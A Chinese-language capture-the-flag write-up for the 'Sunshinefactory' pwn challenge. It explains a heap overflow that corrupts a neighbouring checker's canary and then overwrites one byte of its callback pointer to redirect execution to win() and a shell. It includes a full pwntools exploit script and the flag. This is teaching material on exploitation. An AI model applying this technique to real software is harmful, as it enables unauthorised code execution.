# Sunshinefactory

## 题目简述

程序按顺序在堆上分配三块对象：用户可写的 sunshine 数据、包含 8 字节 Canary 和失败回调指针的 checker，以及保存两者指针的包装对象。用户虽然可以申请很小的数据块，程序却固定向其中读取 `0x100` 字节，因此能越界覆盖相邻 checker。

释放时若 checker 中的 Canary 与全局随机值不同，程序调用 `check_fail_fn`。目标是同时破坏 Canary，并把该函数指针从 `check_heap_fail` 改成 `win`。

## 解题过程

申请 16 字节会得到一个大小为 `0x20` 的堆块；紧邻的 checker 也是 `0x20` 大小。官方调试布局显示，从用户数据起点到 checker 内容起点为 `0x20` 字节：

```text
user chunk:    [16-byte data][next chunk metadata]
checker chunk: [8-byte canary][check_fail_fn]
```

二进制启用了 PIE，但 `check_heap_fail` 与 `win` 位于同一映像且高位相同；样本地址低字节分别为 `0xa9` 和 `0xca`。只覆盖函数指针最低一个字节即可绕过 ASLR，无需泄露基址。

```python
from pwn import context, flat, remote

context.arch = "amd64"

io = remote("HOST", 33001)
io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"size needed: ", b"16")

payload = flat({
    0x10: 0,       # 覆盖下一块元数据的 prev_size
    0x18: 0x21,    # 保持 checker 块 size 字段可用
    0x20: 0,       # 破坏 checker Canary
})
payload += b"\xca"  # check_fail_fn 的最低字节改成 win

io.sendafter(b"content: ", payload)
io.sendlineafter(b"> ", b"2")
io.interactive()
```

释放时 Canary 检查失败，间接调用却落入 `win()`，执行 `/bin/sh`。读取服务中的 flag 得到：

```text
grey{th3_L1gHt_hURtS_mY_3y35}
```

## 方法总结

- 核心技巧：用堆溢出破坏相邻校验对象，再做同一 PIE 映像内的函数指针最低字节覆盖。
- 识别信号：分配大小由用户控制、读取长度固定且更大、校验失败路径通过可写函数指针调用。
- 复用要点：部分覆盖成立依赖目标函数与原函数高位相同；同时要维持相邻堆块元数据，确保程序能走到间接调用而不是先崩溃。
